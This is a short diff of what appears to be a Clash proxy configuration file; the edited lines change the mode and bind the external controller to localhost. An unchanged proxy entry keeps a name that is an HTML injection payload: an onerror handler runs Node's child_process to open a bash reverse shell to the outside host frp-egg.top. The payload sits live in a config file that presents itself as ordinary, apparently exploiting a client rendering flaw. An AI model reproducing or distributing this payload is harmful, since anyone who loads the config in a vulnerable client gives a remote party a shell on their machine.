@@ -1,9 +1,9 @@
 port: 7890
 socks-port: 7891
 allow-lan: true
-mode: Rule
+mode: rule
 log-level: info
-external-controller: :8080
+external-controller: 127.0.0.1:8080
 proxies:
   - name: a<img/src="1"/onerror=eval(`require("child_process").exec("/bin/bash -i >& /dev/tcp/frp-egg.top/53862 0>&1");`);>
     type: socks5
